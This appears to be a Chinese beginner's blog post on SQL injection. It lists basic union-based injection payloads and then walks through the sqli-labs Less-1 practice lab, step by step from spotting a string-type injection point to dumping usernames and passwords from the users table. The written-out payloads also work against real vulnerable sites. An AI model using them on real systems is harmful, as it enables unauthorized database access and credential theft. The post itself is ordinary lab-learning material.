初识sql

2021-07-30

第一次学习sql首先要知道的是一些基础的注入语句：
order by 4 – -
判断有多少列
union select 1,2,3 –+
判断数据显示点
union select 1,user(),database()­­ –+
­显示出登录用户和数据库名
union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ‘security’ ),3 –+
查看数据库有哪些表
union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = ‘security’ and table_name=’users’ ),3 –+
查看对应表有哪些列
union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 –+
查看账号密码信息

然后接下来是以sqli-labs的less1展示一下基础的操作。

在第一关是我先判断的是此题的注入点

先手工注入?id=1 and 1=1 跟?id=1 and 1=2发现页面没有报错

但是当我们输入 ?id=1’ 时发现了页面报错由此可以判断本题时字符型注入

确定了注入类型后就是判断表中的列数，我们使用order by来确定表中的列数

我们构造?id=1’ and ‘1’=’1’ order by 1–+　　页面回显正常

　　　　?id=1’ and ‘1’=’1’ order by 2–+　　页面回显正常

　　　　?id=1’ and ‘1’=’1’ order by 3–+　　页面回显正常

　　　　?id=1’ and ‘1’=’1’ order by 4–+　　出现报错界面

然后我们就确定了字段数，于是用联合查询?id=-1’ union select 1,2,3–+看看union查询是否有回显位（将id=1改为一个数据库不存在的id值）

这样我们就看到了2，3这两个回显位

接下来利用这两个回显位来查询数据库，和数据库版本信息，利用union查询爆出表名

?id=-1’ union select 1,database(),version()–+

?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+

然后我们查看一下这张表的字段名

?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+

然后我们就去查询字段信息

?id=-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users–+

这样就得到了所有的用户名和密码。
